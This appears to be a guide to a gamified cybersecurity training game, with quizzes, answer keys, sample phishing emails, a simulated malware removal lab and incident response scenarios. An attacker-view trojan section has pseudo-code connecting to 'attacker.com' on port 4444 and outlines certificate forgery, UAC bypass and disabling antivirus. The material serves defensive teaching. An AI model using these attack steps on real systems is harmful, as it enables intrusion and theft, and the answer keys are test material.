# 📚 Complete Tutorial Guide with Answers
**Cybersecurity Game Tutorial Compendium**  
*All Game Modes, Instructions, Questions & Answers*

---

## 📖 Table of Contents

### 🟢 BEGINNER TUTORIALS
1. [Cybersecurity Fundamentals](#1-cybersecurity-fundamentals)
2. [Network Basics](#2-network-basics)
3. [Encryption Basics](#3-encryption-basics)
4. [Malware Types Identification](#4-malware-types-identification)
5. [Phishing Lab](#5-phishing-lab)

### 🟡 INTERMEDIATE TUTORIALS
6. [Hands-On Malware Removal Lab](#6-hands-on-malware-removal-lab)

### 🔴 ADVANCED TUTORIALS
7. [Malware Incident Response Simulation](#7-malware-incident-response-simulation)
8. [Trojan Horse Tutorial (Hacker POV)](#8-trojan-horse-tutorial-hacker-pov)

---

# 🟢 BEGINNER TUTORIALS

---

## 1. Cybersecurity Fundamentals

### 📋 Overview
- **Tutorial ID:** `beginner_fundamentals`
- **Duration:** ~10 minutes
- **Format:** Multi-section learning + Quiz
- **Max Score:** 200 points (4 questions × 50 points each)
- **XP Rewards:** 
  - 100% (200/200): 200 XP
  - 75%+ (150-199): 150 XP
  - 50-74% (100-149): 100 XP
  - Below 50%: 0 XP

### 📚 Learning Sections

#### Section 1: Introduction
**What is Cybersecurity?**

Cybersecurity = Protecting computers, networks, and data from attacks.

**Core Topics:**
- 📚 The CIA Triad - 3 core principles of security
- 🎯 Threat Model - Understanding attackers

---

#### Section 2: CIA Triad - Confidentiality
**Definition:** Keeping secrets - only authorized people can access information.

**Examples:**
- ✓ Passwords (only you should know yours)
- ✓ Medical records (only you and your doctor)
- ✓ Credit card numbers (only you and the bank)
- ✓ Company secrets (trade secrets, financial data)

**How it's protected:**
- Encryption (scrambles data)
- Access controls (passwords, permissions)
- Authentication (proving who you are)

**Breach Examples:**
- ❌ Hacker steals customer database
- ❌ Employee leaks financial reports
- ❌ Someone reads your private messages

---

#### Section 3: CIA Triad - Integrity
**Definition:** Preventing tampering - data is accurate and unmodified.

**Examples:**
- ✓ Bank account balance (must be exact)
- ✓ Software downloads (no hidden malware)
- ✓ Medical prescriptions (correct dosage)
- ✓ Website content (not defaced)

**How it's protected:**
- Digital signatures (proves authenticity)
- Checksums/hashes (detects changes)
- Version control (tracks modifications)
- Access controls (limits who can edit)

**Breach Examples:**
- ❌ Hacker changes your bank balance
- ❌ Malware injected into software update
- ❌ Website modified to spread misinformation

---

#### Section 4: CIA Triad - Availability
**Definition:** Keeping services running - systems accessible when needed.

**Examples:**
- ✓ Website is online 24/7
- ✓ Email server responds quickly
- ✓ Hospital systems work during emergencies
- ✓ ATM machines dispense cash

**How it's protected:**
- Redundancy (backup servers)
- Load balancing (distribute traffic)
- DDoS protection (block attack traffic)
- Disaster recovery plans

**Breach Examples:**
- ❌ DDoS attack crashes website
- ❌ Ransomware locks all files
- ❌ Server outage (hardware failure)

---

#### Section 5: Threat Model
**Understanding Threats, Vulnerabilities, and Risks**

**🎯 THREAT = Potential danger or attacker**
- Examples: Hackers, malware, insider threats, natural disasters
- Think: "WHAT could attack us?"

**🕳️ VULNERABILITY = Weakness that can be exploited**
- Examples: Outdated software, weak passwords, misconfiguration
- Think: "WHERE are we weak?"

**⚠️ RISK = Likelihood + Impact**
- Formula: `Risk = Threat × Vulnerability × Impact`
- Think: "HOW bad could it be?"

**Example:**
```
Threat: Ransomware hackers
Vulnerability: No backups, outdated Windows
Risk: HIGH (if attacked, lose all files)

Mitigation: Update Windows + create backups
Result: Risk = LOW (can restore from backup)
```

---

### ✅ Quiz Questions & Answers

#### Question 1
**Q:** A hacker steals your password database. Which part of CIA Triad is violated?

**Options:**
- A) Confidentiality ✅ **CORRECT**
- B) Integrity
- C) Availability

**Explanation:** Confidentiality means keeping data SECRET. Stolen passwords = confidentiality breach!

---

#### Question 2
**Q:** An attacker modifies your website to show fake information. Which is violated?

**Options:**
- A) Confidentiality
- B) Integrity ✅ **CORRECT**
- C) Availability

**Explanation:** Integrity means data is ACCURATE and unmodified. Changed website = integrity breach!

---

#### Question 3
**Q:** A DDoS attack makes your website unreachable. Which is violated?

**Options:**
- A) Confidentiality
- B) Integrity
- C) Availability ✅ **CORRECT**

**Explanation:** Availability means services are ACCESSIBLE. Website down = availability breach!

---

#### Question 4
**Q:** What is the difference between Threat and Vulnerability?

**Options:**
- A) Threat = potential danger, Vulnerability = weakness ✅ **CORRECT**
- B) They are the same thing
- C) Vulnerability = attacker, Threat = defense

**Explanation:** Threat = what CAN happen (hacker attack). Vulnerability = weakness that makes it possible (outdated software).

---

### 🎯 Scoring System
- Each correct answer: +50 points
- Total possible: 200 points
- Score displayed: `Score: X/200`

---

## 2. Network Basics

### 📋 Overview
- **Tutorial ID:** `beginner_network`
- **Duration:** ~10 minutes
- **Format:** Multi-section learning + Quiz
- **Max Score:** 150 points (3 questions × 50 points each)
- **XP Rewards:** Same as Fundamentals

### 📚 Learning Sections

#### Section 1: Introduction
Understanding how computers communicate:
- 🌐 IP Addresses (computer addresses)
- 🚪 Ports (doors for services)
- 📡 Protocols (languages computers speak)

---

#### Section 2: IP Addresses
**Definition:** Unique identifier for computers on a network.

**Two Types:**

**1️⃣ PRIVATE IP (Local Network Only)**
- 192.168.x.x, 10.x.x.x, 172.16-31.x.x
- Only visible on your home/office network
- Router assigns these
- Example: Your laptop = 192.168.1.100

**2️⃣ PUBLIC IP (Internet-Facing)**
- Visible to entire internet
- ISP assigns one per router
- Example: Your home router = 45.67.89.123
- All devices share this PUBLIC IP

**Network Diagram:**
```
[Your Laptop]          [Your Phone]
192.168.1.100          192.168.1.101
       ↓                     ↓
    [Home Router] ← Public IP: 45.67.89.123
           ↓
      [Internet]
           ↓
  [Attacker Server] ← Public IP: 45.33.32.156
```

---

#### Section 3: Ports
**Definition:** Apartment numbers for services on one computer.

**Format:** `IP:Port` → `192.168.1.100:80`

**Common Ports:**
- ✓ Port 80 = HTTP (websites)
- ✓ Port 443 = HTTPS (secure websites)
- ✓ Port 22 = SSH (remote login)
- ✓ Port 25 = SMTP (email)
- ✓ Port 3389 = RDP (Windows Remote Desktop)

**⚠️ Suspicious Ports (malware):**
- ❌ Port 4444 = Common backdoor
- ❌ Port 31337 = "Elite" hacker port
- ❌ Port 1337 = Hacker favorite

**Example:** `Connection to 45.33.32.156:4444` → 🚨 RED FLAG!

---

#### Section 4: Protocols
**Definition:** Rules for how computers communicate.

**Web Protocols:**
- **HTTP** = Not encrypted (anyone can read data)
- **HTTPS** = Encrypted (safe for passwords)

**Email Protocols:**
- **SMTP** = Send email (port 25)
- **POP3/IMAP** = Receive email (ports 110/143)

**Network Protocols:**
- **TCP** = Reliable delivery (confirms packets)
- **UDP** = Fast but unreliable (streaming, gaming)

**Security Protocols:**
- **SSH** = Secure remote login (port 22)
- **TLS/SSL** = Encryption layer (used in HTTPS)

**Protocol Stack:**
```
Application:  HTTP, FTP, SSH
     ↓
Transport:    TCP, UDP
     ↓
Internet:     IP (routing)
     ↓
Physical:     WiFi, Ethernet
```

---

### ✅ Quiz Questions & Answers

#### Question 1
**Q:** You see traffic to 45.33.32.156:4444. What does port 4444 indicate?

**Options:**
- A) Normal web browsing
- B) Suspicious backdoor port ✅ **CORRECT**
- C) Email connection

**Explanation:** Port 4444 is commonly used by backdoor trojans! Port 80/443 = web, Port 4444 = suspicious!

---

#### Question 2
**Q:** What's the difference between public and private IP addresses?

**Options:**
- A) Public = internet, Private = local network only ✅ **CORRECT**
- B) They are the same
- C) Private = faster, Public = slower

**Explanation:** Private IPs (192.168.x.x) work only on local network. Public IPs are visible to the entire internet!

---

#### Question 3
**Q:** Which protocol is secure (encrypted)?

**Options:**
- A) HTTP
- B) HTTPS ✅ **CORRECT**
- C) FTP

**Explanation:** HTTPS uses encryption (the 'S' = Secure). HTTP sends data in plaintext - anyone can read it!

---

### 🎯 Scoring System
- Each correct answer: +50 points
- Total possible: 150 points

---

## 3. Encryption Basics

### 📋 Overview
- **Tutorial ID:** `beginner_encryption`
- **Duration:** ~12 minutes
- **Format:** Demo + Challenge + Education
- **Max Score:** 100 points
- **XP Rewards:** Same as other beginner tutorials
- **Minimum Score:** 50 points (after 3 wrong attempts)

### 📚 Learning Phases

#### Phase 1: Introduction
**What is Encryption?**

Encryption transforms readable text (plaintext) into unreadable code (ciphertext).

**Example:**
```
Original: "HELLO"
Encrypted: "KHOOR"
```

Only someone with the KEY can decrypt it back.

---

#### Phase 2: Encryption Demo
**Caesar Cipher Demo**

Each letter shifts by a number (the KEY).

**Try it:**
1. Enter a message: `HELLO WORLD`
2. Set shift key: `3`
3. Click ENCRYPT
4. Result: `KHOOR ZRUOG`

---

#### Phase 3: Decryption Challenge
**Your Turn!**

**Encrypted Message:** `WKLV LV VHFUHW`  
**Key:** 3

**Task:** Decrypt by shifting each letter BACKWARDS by 3.

**Solution:**
```
W → T
K → H
L → I
V → S

Answer: "THIS IS SECRET"
```

**Scoring:**
- Correct on 1st try: +100 points
- Each wrong attempt: -10 points
- After 3 wrong attempts: Auto-show answer, 50 points minimum

---

#### Phase 4: Ransomware Explanation
**Why Ransomware is Dangerous**

**Caesar Cipher:** Easy to crack (only 26 keys)

**Modern Ransomware:** AES-256 encryption
- 2^256 possible keys (more than atoms in universe!)
- Billions of years to try all keys
- Mathematically impossible to crack

**How Ransomware Works:**
1. Uses AES-256 (unbreakable encryption)
2. Deletes key from your computer
3. Attacker keeps only copy of key
4. Demands payment for key

**Your Defense:**
- ✅ Daily backups
- ✅ Air-gapped backups (offline)
- ✅ Cloud + local copies
- ❌ NEVER pay ransom

---

### 🎯 Scoring System
- Correct answer: 100 points
- Wrong attempts: -10 points each
- Minimum guarantee: 50 points (after 3 attempts)

---

## 4. Malware Types Identification

### 📋 Overview
- **Tutorial ID:** `beginner_malware`
- **Duration:** 90 seconds (timed!)
- **Format:** Drag-and-drop identification game
- **Max Score:** 100 points
- **Total Incidents:** 6
- **XP Rewards:** Same as other tutorials

### 🎮 How to Play

1. **Read incident reports** - Each shows symptoms
2. **Drag malware buttons** - Drag correct type to report
3. **Beat the clock** - 90 seconds to identify all 6
4. **Score breakdown:**
   - Completion: 50 points (max)
   - Time bonus: 50 points (max)
   - Formula: `score = (reports_solved/6 × 50) + (time_remaining/90 × 50)`

---

### 📋 Incident Reports & Answers

#### Incident #2847
**Symptoms:**
- All files encrypted with .locked extension
- Ransom note demanding Bitcoin payment
- Desktop wallpaper changed to payment instructions

**Answer:** 🔒 **RANSOMWARE**

**Explanation:** Ransomware encrypts files and demands payment in cryptocurrency

---

#### Incident #1923
**Symptoms:**
- Pop-up advertisements appearing constantly
- Browser homepage changed without permission
- System running slower than usual

**Answer:** 📢 **ADWARE**

**Explanation:** Adware displays unwanted ads and tracks browsing habits

---

#### Incident #5634
**Symptoms:**
- Program disguised as video game installer
- Creates backdoor access for remote control
- Firewall alerts about unauthorized connections

**Answer:** 🐴 **TROJAN**

**Explanation:** Trojans disguise themselves as legitimate software

---

#### Incident #7721
**Symptoms:**
- Keylogger recording all passwords
- Banking credentials stolen
- Runs silently in background processes

**Answer:** 🕵️ **SPYWARE**

**Explanation:** Spyware secretly monitors activity and steals personal data

---

#### Incident #3309
**Symptoms:**
- Infected email attachment executed
- Malware attaches to .exe and .doc files
- Spreads when files are shared via USB

**Answer:** 🦠 **VIRUS**

**Explanation:** Viruses self-replicate by attaching to files

---

#### Incident #8156
**Symptoms:**
- Spreads automatically across entire network
- Does not require user interaction
- Consumes massive bandwidth

**Answer:** 🐛 **WORM**

**Explanation:** Worms self-replicate and spread across networks automatically

---

### 📚 Reference Sheet

**Available during game:**

**🦠 VIRUS**
- Attaches to files
- Spreads via USB, email
- Requires user to run file

**🐛 WORM**
- Spreads automatically
- No user interaction needed
- Consumes network bandwidth

**🐴 TROJAN**
- Disguises as legitimate software
- Creates backdoors
- Remote access tool

**🔒 RANSOMWARE**
- Encrypts files
- Demands payment
- Bitcoin/cryptocurrency

**🕵️ SPYWARE**
- Monitors activity
- Steals passwords
- Keyloggers, screen capture

**📢 ADWARE**
- Shows ads
- Tracks browsing
- Slows system

---

### 🎯 Scoring System
```
Completion Score = (Reports Solved / 6) × 50
Time Bonus = (Time Remaining / 90) × 50
Final Score = Completion Score + Time Bonus
```

**Example:**
- Solved 6/6 reports
- Time remaining: 45 seconds
- Completion: 50 points
- Time bonus: 25 points
- **Final: 75/100**

---

## 5. Phishing Lab

### 📋 Overview
- **Tutorial ID:** `beginner_phishing`
- **Duration:** 90 seconds (timed!)
- **Format:** Email classification game
- **Total Emails:** 8
- **Max Score:** 1200 points (8 emails × 150 points each)
- **XP Rewards:** Based on percentage (90%+ = 200 XP)

### 🎮 How to Play

1. **Read each email** carefully
2. **Click SAFE or PHISHING** button
3. **Learn from feedback** - Red flags or legitimate signs
4. **Beat the clock** - 90 seconds total

**Scoring:**
- Correct identification: +150 points
- Wrong identification: -50 points

---

### 📧 Email 1: PayPal Phishing

**From:** security@paypa1-secure.tk  
**Subject:** 🚨 URGENT: Verify Your Account Now!

**Body:**
```
Dear Customer,

Your PayPal account will be SUSPENDED in 24 hours 
if you don't verify your identity immediately!

Click here to verify: http://paypal-verify.tk/login

Best regards,
PayPal Security Team
```

**Answer:** 🚨 **PHISHING**

**Red Flags:**
- Generic greeting ('Dear Customer')
- Urgent threatening language
- Fake domain (.tk instead of .com)
- Typo in sender: 'paypa1' not 'paypal'
- Suspicious link domain

---

### 📧 Email 2: Legitimate Netflix Receipt

**From:** noreply@netflix.com  
**Subject:** Your Netflix receipt

**Body:**
```
Hi Sarah,

Your $15.99 payment for Netflix Premium was processed 
successfully on November 29, 2025.

Watch history this month:
- Stranger Things S4
- The Crown S6

Thank you for being a member!

The Netflix Team
```

**Answer:** ✅ **SAFE (Legitimate)**

**Legitimate Signs:**
- Personal greeting (uses your name)
- No urgent action required
- Official @netflix.com domain
- Specific transaction details
- No suspicious links

---

### 📧 Email 3: Password Reset Phishing

**From:** it-support@company-email.com  
**Subject:** Password Expiration Warning

**Body:**
```
Your company password will expire tomorrow.

Please click this link to update your password: 
http://bit.ly/pwdreset2025

IT Support
```

**Answer:** 🚨 **PHISHING**

**Red Flags:**
- Suspicious shortened URL (bit.ly)
- Generic 'IT Support' signature
- Unexpected password reset request
- No company branding or logo
- Creates false urgency

---

### 📧 Email 4: Legitimate Amazon Order

**From:** support@amazon.com  
**Subject:** Your Amazon.com order #402-1849302-7829103

**Body:**
```
Hello John,

Your order has been shipped!

Order Details:
- Wireless Mouse (Black) - $24.99
- Delivery: Dec 2, 2025
- Track package: [View in Amazon account]

Amazon Customer Service
```

**Answer:** ✅ **SAFE (Legitimate)**

**Legitimate Signs:**
- Real Amazon order number format
- Personal name used
- Specific product details
- No external links (directs to account)
- Official @amazon.com domain

---

### 📧 Email 5: Lottery Scam

**From:** prize-winner@lottery-international.org  
**Subject:** 🎉 YOU'VE WON $1,000,000! Claim Now!

**Body:**
```
CONGRATULATIONS!

You have been selected as the WINNER of our 
International Lottery!

Prize: $1,000,000 USD

To claim your prize, send your:
- Full name
- Address
- Bank account number
- Social security number

Reply within 48 hours or forfeit!
```

**Answer:** 🚨 **PHISHING**

**Red Flags:**
- 'Too good to be true' prize
- Requests sensitive information
- Suspicious sender domain (.org)
- High-pressure deadline
- You never entered a lottery!
- Requests bank/SSN info via email

---

### 📧 Email 6: Legitimate GitHub Security

**From:** notifications@github.com  
**Subject:** [GitHub] Password changed successfully

**Body:**
```
Hi @username,

Your GitHub password was changed on November 29, 2025 
at 10:45 AM PST.

If you didn't make this change, please secure your 
account immediately:
https://github.com/settings/security

GitHub Security Team
```

**Answer:** ✅ **SAFE (Legitimate)**

**Legitimate Signs:**
- Official @github.com domain
- Specific date/time of action
- Includes your GitHub username
- Legitimate security link
- Standard security notification

---

### 📧 Email 7: CEO Fraud (Business Email Compromise)

**From:** ceo@company.com  
**Subject:** URGENT: Wire Transfer Needed

**Body:**
```
I'm in a meeting and need you to process an urgent 
wire transfer immediately.

Amount: $50,000
Account: [Bank details attached]

This is confidential. Don't discuss with anyone.

- CEO
```

**Answer:** 🚨 **PHISHING**

**Red Flags:**
- CEO Fraud / Business Email Compromise
- Creates false urgency
- Requests large money transfer
- Orders to keep it secret
- Unusual request from executive
- Should verify via phone call!

---

### 📧 Email 8: Legitimate Slack Invite

**From:** team@slack.com  
**Subject:** You're invited to join Engineering Team workspace

**Body:**
```
Hi Alex,

John Doe invited you to join the 'Engineering Team' 
workspace on Slack.

Click to join: https://slack.com/accept-invite/T01234/B56789

Workspace: Engineering Team (acme-corp.slack.com)

The Slack Team
```

**Answer:** ✅ **SAFE (Legitimate)**

**Legitimate Signs:**
- Official @slack.com domain
- Specific workspace name shown
- Legitimate Slack invite URL structure
- Names who invited you
- Standard Slack invite format

---

### 🎯 Scoring System
```
Correct: +150 points
Wrong: -50 points
Max Score: 1200 points (8 × 150)

Grade Scale:
90%+: Grade A
80-89%: Grade B
70-79%: Grade C
60-69%: Grade D
<60%: Grade F
```

---

# 🟡 INTERMEDIATE TUTORIALS

---

## 6. Hands-On Malware Removal Lab

### 📋 Overview
- **Tutorial ID:** `intermediate_defense`
- **Duration:** ~15-20 minutes
- **Format:** Interactive command-line simulation
- **Max Score:** 1000 points
- **Phases:** 5 (Download → Infection → Detection → Containment → Eradication)

### 🎮 How to Play

**You are the victim!** Experience a malware infection firsthand, then use CMD commands to remove it.

**Phase Flow:**
1. **Download:** Click fake game installer
2. **Infection:** Malware executes
3. **Detection:** Use CMD to find malware
4. **Containment:** Kill processes & block C2
5. **Eradication:** Remove all traces

---

### 📚 Available Commands

#### Detection Commands

**`tasklist`** - List all running processes
```
Output:
explorer.exe          PID: 1234    Normal
svchost.exe          PID: 5678    Normal
malware.exe          PID: 9012    ⚠️ SUSPICIOUS
svchost32.exe        PID: 3456    ⚠️ SUSPICIOUS (Fake svchost)
updater.exe          PID: 7890    ⚠️ SUSPICIOUS
```

**`netstat -ano`** - Show network connections
```
Output:
192.168.1.100 → 8.8.8.8:443           [HTTPS - Normal]
192.168.1.100 → 45.33.32.156:443      ⚠️ [C2 SERVER - MALWARE]
```

**`dir %appdata%`** - Check AppData folder
```
Output:
malware.exe            120 KB   ⚠️ MALICIOUS
svchost32.exe           95 KB   ⚠️ MALICIOUS
```

---

#### Containment Commands

**`taskkill /F /IM malware.exe`** - Kill malicious process
```
Result: ✅ Process terminated successfully
```

**`taskkill /F /IM svchost32.exe`** - Kill fake svchost
```
Result: ✅ Process terminated successfully
```

**`taskkill /F /IM updater.exe`** - Kill updater process
```
Result: ✅ Process terminated successfully
```

**`netsh advfirewall firewall add rule name="blockmfw" dir=out remoteip=45.33.32.156 action=block`**
```
Result: ✅ Firewall rule added - C2 server blocked!
```

---

#### Eradication Commands

**`reg delete "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "WindowsUpdate" /f`**
```
Result: ✅ Registry key deleted - Persistence removed!
```

**`del /F /Q "%appdata%\malware.exe"`**
```
Result: ✅ Malicious file deleted!
```

**`del /F /Q "%appdata%\svchost32.exe"`**
```
Result: ✅ Malicious file deleted!
```

**`schtasks /delete /tn "SystemUpdate" /f`**
```
Result: ✅ Scheduled task removed!
```

---

### 🎯 Complete Solution (Step-by-Step)

#### Phase 3: Detection
```bash
tasklist
netstat -ano
```
**Goal:** Identify malicious processes and C2 connection  
**Completion Bonus:** +100 points

---

#### Phase 4: Containment
```bash
taskkill /F /IM malware.exe
taskkill /F /IM svchost32.exe
taskkill /F /IM updater.exe
netsh advfirewall firewall add rule name="blockmfw" dir=out remoteip=45.33.32.156 action=block
```
**Goal:** Stop malware execution and block C2  
**Completion Bonus:** +100 points

---

#### Phase 5: Eradication
```bash
reg delete "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "WindowsUpdate" /f
del /F /Q "%appdata%\malware.exe"
del /F /Q "%appdata%\svchost32.exe"
schtasks /delete /tn "SystemUpdate" /f
```
**Goal:** Remove all malware traces  
**Completion Bonus:** +150 points

---

### 🎯 Scoring System
```
Starting Score: 1000 points
Wrong commands: -10 points each
Detection completion: +100 points
Containment completion: +100 points
Eradication completion: +150 points
Time bonus: +0 to +180 points (under 3 minutes)

Grade Scale:
900+: S-RANK (Cyber Expert!)
750-899: A-RANK (Security Pro!)
600-749: B-RANK (Good Work!)
<600: C-RANK (Keep Learning!)
```

---

### 💡 Hints System
- Hints appear after 15 seconds of inactivity
- No penalty for using hints
- Phase-specific guidance

**Detection Phase Hints:**
- "Type 'tasklist' to see running processes"
- "Type 'netstat -ano' to check network connections"

**Containment Phase Hints:**
- "Use 'taskkill /F /IM malware.exe' to stop the process"

**Eradication Phase Hints:**
- "Use 'reg delete' to remove persistence keys"
- "Use 'del /F /Q' to delete malicious files"

---

# 🔴 ADVANCED TUTORIALS

---

## 7. Malware Incident Response Simulation

### 📋 Overview
- **Tutorial ID:** `advance_scenarios`
- **Duration:** ~10-15 minutes
- **Format:** Multiple-choice decision making
- **Max Score:** 1000 points
- **Phases:** 5 (Detection → Investigation → Containment → Eradication → Recovery)

### 🎮 How to Play

**Realistic incident response simulation.** Make decisions at each phase of a malware attack.

**Scoring:**
- Start: 1000 points
- Correct action: +50 bonus
- Wrong action: -150 to -200 penalty

---

### 📋 Scenario 1: DETECTION

**Alert:**
```
SECURITY ALERT: Employee John Doe clicked 'invoice.pdf.exe'
Endpoint Detection: Suspicious process spawned on PC-ACCOUNTING-07
```

**Your Actions:**
- A) Delete the file immediately
- B) Isolate machine from network ✅ **CORRECT**
- C) Restart the computer

**Correct Answer:** **B) Isolate machine from network**

**Why?**
- ✅ Network isolation prevents lateral movement
- ✅ Stops C2 communication
- ❌ Deleting/restarting triggers fail-safe mechanisms
- ❌ Malware may spread or encrypt immediately

**Penalty for Wrong:** -200 points

---

### 📋 Scenario 2: INVESTIGATION

**Alert:**
```
Machine isolated. Analyzing system state...
What should you investigate FIRST?
```

**Your Actions:**
- A) Check browser history
- B) Analyze network connections & processes ✅ **CORRECT**
- C) Scan with antivirus

**Correct Answer:** **B) Analyze network connections & processes**

**Why?**
- ✅ Network connections reveal C2 servers
- ✅ Shows what attacker is doing RIGHT NOW
- ❌ Browser history too slow
- ❌ AV scan takes too long

**Discovery:**
```
You found:
- C2 Server: 45.33.32.156:443
- Process: invoice.exe spawned hidden PowerShell scripts
```

**Penalty for Wrong:** -150 points

---

### 📋 Scenario 3: CONTAINMENT

**Alert:**
```
Threat identified: Trojan with C2 connection to 45.33.32.156
What is your NEXT containment action?
```

**Your Actions:**
- A) Unplug the network cable only
- B) Kill processes + Block C2 IP at firewall ✅ **CORRECT**
- C) Shutdown the computer

**Correct Answer:** **B) Kill processes + Block C2 IP at firewall**

**Why?**
- ✅ Multi-layer containment is best
- ✅ Killing processes stops execution
- ✅ Firewall block prevents reconnection
- ❌ Unplugging alone: Malware persists, reconnects after reboot
- ❌ Shutdown: Loses volatile memory evidence (RAM)

**Penalty for Wrong:** -150 points

---

### 📋 Scenario 4: ERADICATION

**Alert:**
```
Processes killed, C2 blocked. Removing persistence mechanisms...
Where does this Trojan typically hide?
```

**Your Actions:**
- A) Only in Downloads folder
- B) Registry Run keys + Scheduled Tasks + AppData ✅ **CORRECT**
- C) Desktop shortcuts

**Correct Answer:** **B) Registry Run keys + Scheduled Tasks + AppData**

**Why?**
- ✅ Trojans use multiple persistence methods
- ❌ If you miss registry keys or scheduled tasks, malware auto-restarts

**Removed:**
```
✅ HKCU\...\Run\WindowsUpdate
✅ Scheduled Task: 'SystemUpdate'
✅ C:\Users\JohnDoe\AppData\Roaming\svchost32.exe
```

**Penalty for Wrong:** -150 points

---

### 📋 Scenario 5: RECOVERY

**Alert:**
```
Malware removed successfully. Final recovery step?
How do you ensure system integrity?
```

**Your Actions:**
- A) Just restart and continue working
- B) Restore from clean backup + Patch vulnerability + Train user ✅ **CORRECT**
- C) Reinstall OS (nuclear option)

**Correct Answer:** **B) Restore from backup + Patch + Train user**

**Why?**
- ✅ Defense-in-depth recovery strategy
- ✅ Clean backup ensures no remnants
- ✅ Patch closes attack vector
- ✅ User training prevents re-infection
- ❌ Restarting alone: Rootkit components may remain
- ❌ Full reinstall: Overkill, causes downtime

**Result:** 🎯 INCIDENT RESOLVED!

**Penalty for Wrong:** -150 points

---

### 🎯 Scoring System
```
Starting Score: 1000 points
Correct answers: +50 bonus each
Wrong answers: -150 to -200 penalty
Time bonus: +0 to +300 (under 5 minutes)

Final Grade:
900+: S-RANK (Security Expert! 🏆)
750-899: A-RANK (Incident Response Pro! 🥇)
600-749: B-RANK (Good Security Awareness 🥈)
400-599: C-RANK (Needs More Training 🥉)
<400: D-RANK (Review the Basics 📚)
```

---

## 8. Trojan Horse Tutorial (Hacker POV)

### 📋 Overview
- **Tutorial ID:** Special educational tutorial
- **Duration:** ~10 minutes
- **Format:** Narrative walkthrough from attacker perspective
- **Purpose:** Educational - understand attack to better defend
- **Phases:** 6 (Create → Disguise → Deploy → Execute → Backdoor → Defense)

### ⚠️ Disclaimer
**This is EDUCATIONAL ONLY!** Understanding how attacks work helps you defend against them.

---

### 📚 Phase-by-Phase Breakdown

#### Phase 1: Create Payload

**Objective:** Create malicious backdoor trojan

**Code Snippet:**
```javascript
// Trojan code snippet:
function createBackdoor() {
    openPort(4444);
    connectToC2("attacker.com");
    hideProcess();
    setPersistence();
}
```

**What It Does:**
- Opens port 4444 for remote access
- Connects to Command & Control server
- Hides from Task Manager
- Auto-starts on boot

**Defense Tip:** 🛡️  
Always scan downloaded files with antivirus before running!

---

#### Phase 2: Disguise

**Objective:** Make malware look legitimate

**Disguise Settings:**
```
filename = "SuperGame_Setup.exe"
icon = "game_icon.ico"
description = "Official Installer"
publisher = "GameStudio Inc."
certificate = FORGED
```

**Techniques:**
- Use game/software name
- Add realistic icons
- Fake publisher information
- Forged digital signature

**Defense Tip:** 🛡️  
Check publisher certificates! Verify software is from official sources.

---

#### Phase 3: Deploy

**Objective:** Upload trojan to distribution sites

**Deployment Targets:**
```
✓ Free-Games-Download.com
✓ TorrentSite.org
✓ SoftwarePortal.net
✓ Email attachment (phishing)

Status: UPLOADED
Views: 1,247 downloads
```

**Distribution Methods:**
- File-sharing sites
- Torrent networks
- Fake download portals
- Phishing emails

**Defense Tip:** 🛡️  
Only download from official websites. Avoid torrents and file-sharing!

---

#### Phase 4: Execute

**Objective:** Victim runs the trojan

**Execution Log:**
```
[+] Trojan executed successfully
[+] Admin privileges: NO (using UAC bypass)
[+] Disabling Windows Defender...
[+] Creating persistence...
[+] Establishing connection...
```

**What Happens:**
- Trojan runs with user privileges
- Bypasses UAC (User Account Control)
- Disables antivirus
- Creates registry entries
- Connects to C2 server

**Victim's Experience:**
```
"Weird... the installer crashed.
Maybe I'll try again later..."
```

**Defense Tip:** 🛡️  
Never disable antivirus to run installers. That's a red flag!

---

#### Phase 5: Backdoor Access

**Objective:** Attacker gains full remote access

**Backdoor Active:**
```
C2 Server: CONNECTED
Port 4444: OPEN
Privileges: USER

Available commands:
> download_files
> capture_screen
> log_keystrokes
> steal_passwords
```

**Attacker Capabilities:**
- Access file system
- Control webcam
- Log keystrokes
- Steal passwords
- Install more malware

**Victim Status:**
```
🔴 COMPROMISED

"Everything seems normal..."

[Hidden processes running]
[Data being exfiltrated]
```

---

#### Phase 6: Defense Lesson

**🛡️ HOW TO DEFEND AGAINST TROJANS**

**Prevention:**
- ✅ Only download from official websites
- ✅ Verify digital signatures
- ✅ Keep antivirus updated
- ✅ Enable firewall
- ✅ Don't disable security software

**Detection:**
- ✅ Monitor network connections (netstat)
- ✅ Check running processes (Task Manager)
- ✅ Look for suspicious ports (4444, 31337)
- ✅ Use anti-malware scanners
- ✅ Watch for unusual firewall alerts

**Removal:**
- ✅ Kill malicious processes
- ✅ Block C2 IP at firewall
- ✅ Remove registry persistence
- ✅ Delete malicious files
- ✅ Restore from clean backup

**Red Flags:**
- ❌ Software from unofficial sources
- ❌ Installer asks to disable antivirus
- ❌ Unexpected network connections
- ❌ Hidden processes in AppData
- ❌ Firewall alerts to port 4444

---

### 🎯 Key Takeaways

**What You Learned:**
1. How trojans are created and disguised
2. Distribution methods attackers use
3. How trojans gain persistence
4. What backdoor access looks like
5. How to defend your system

**Remember:**
- Understanding attacks = Better defense
- Never download from untrusted sources
- Verify software authenticity
- Keep security software enabled
- Monitor your system regularly

---

# 📊 XP & Progression System

### XP Rewards by Tutorial

| Tutorial | Max Score | 100% XP | 75%+ XP | 50-74% XP | <50% XP |
|----------|-----------|---------|---------|-----------|---------|
| **Beginner Fundamentals** | 200 | 200 | 150 | 100 | 0 |
| **Beginner Network** | 150 | 200 | 150 | 100 | 0 |
| **Beginner Encryption** | 100 | 200 | 150 | 100 | 0 |
| **Beginner Malware** | 100 | 200 | 150 | 100 | 0 |
| **Beginner Phishing** | 1200 | 200 | 150 | 100 | 0 |
| **Intermediate Defense** | 1000 | 200 | 150 | 100 | 0 |
| **Advanced Scenarios** | 1000 | 200 | 150 | 100 | 0 |

### Rank System

| Rank | XP Required | Icon |
|------|-------------|------|
| **Iron** | 0 - 499 | 🔩 |
| **Bronze** | 500 - 999 | 🥉 |
| **Silver** | 1000 - 1499 | 🥈 |
| **Gold** | 1500 - 1999 | 🥇 |
| **Platinum** | 2000 - 2499 | 💎 |
| **Diamond** | 2500 - 2999 | 💠 |
| **Master** | 3000 - 3499 | ⭐ |
| **Challenger** | 3500+ | 👑 |

---

# 🎮 Tutorial Navigation Flow

```
Landing Page
    ↓
Mode Selection
    ↓
┌───────────────────────────────────────┐
│  BEGINNER TUTORIALS                   │
│  ├─ Cybersecurity Fundamentals       │
│  ├─ Network Basics                   │
│  ├─ Encryption Basics                │
│  ├─ Malware Types                    │
│  └─ Phishing Lab                     │
└───────────────────────────────────────┘
    ↓
┌───────────────────────────────────────┐
